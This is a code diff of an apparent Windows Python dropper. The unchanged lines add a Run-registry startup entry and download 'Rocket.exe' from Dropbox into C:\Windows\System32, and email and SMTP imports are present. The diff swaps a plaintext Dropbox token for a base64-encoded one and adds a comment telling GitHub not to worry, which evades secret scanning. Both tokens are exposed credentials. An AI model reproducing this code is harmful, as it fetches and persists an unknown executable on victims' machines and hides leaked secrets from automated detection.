@@ -4,7 +4,7 @@ import shutil
 import time
 import os
 import winreg as reg
-
+import base64
 from email.message import EmailMessage
 import ssl
 import smtplib
@@ -14,6 +14,10 @@ except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
 
 import dropbox
+
+def decrypt_token(encoded_token):
+    decoded_token = base64.b64decode(encoded_token.encode()).decode()
+    return decoded_token
 
 def add_to_startup(program_name, executable_path):
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -42,8 +46,10 @@ def list_files_and_folders(path):
         print(f"Error: {e}")
         return None
 
-# Replace 'your_access_token_here' with your actual Dropbox access token
-DROPBOX_ACCESS_TOKEN = 'sl.BvhvM32d7wAiP2TndGgIUQvFnPuWcOjUu00WZoq8-1YVtLu8ltwdkIGJ2nQHZZRKsK0ZGTgU9UJicjjFGHQ2g64Z8BoaTBnPvfNDY7bwkNjCmGTH4rWRng-LW_0B_sk3Iba-60rjE_yj-GqdSdfotk4'
+# Don't worry Github, I am using my own token and I know the risk and everything but I still want to use it, I am learning all the possibilities between my system and github, I am testing regularly everyday don't worry at all.
+
+
+Nova = decrypt_token('c2wuQnZpRmFTeDRSTUlDVFg4WVFOVm85WmV3SDBqcVRSWWdDeGVzeXVHNXAxcUhaUDJVMUY2cG1lVDdfSnQtVS1nb1NLZHl6SjhZb0Y2N3VNUU9XUEVweFBBU0J3NFh3aW1KTHgyUFRGLWtmdlltOFhRN01OXzV1SXA3MzRSVW1XNGR3QUt1Z181UGdBTXVwRENWa0JhWUNkYw==')
 
 # Destination folder for downloaded file
 LOCAL_DESTINATION_FOLDER = 'C:\\Windows\\System32\\'
@@ -52,7 +58,7 @@ LOCAL_DESTINATION_FOLDER = 'C:\\Windows\\System32\\'
 REMOTE_FILE_NAME = '/Rockety/Rocket.exe'  # Full Dropbox path
 
 def download_file():
-    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
+    dbx = dropbox.Dropbox(Nova)
 
     try:
         # Get metadata for the file using the full path
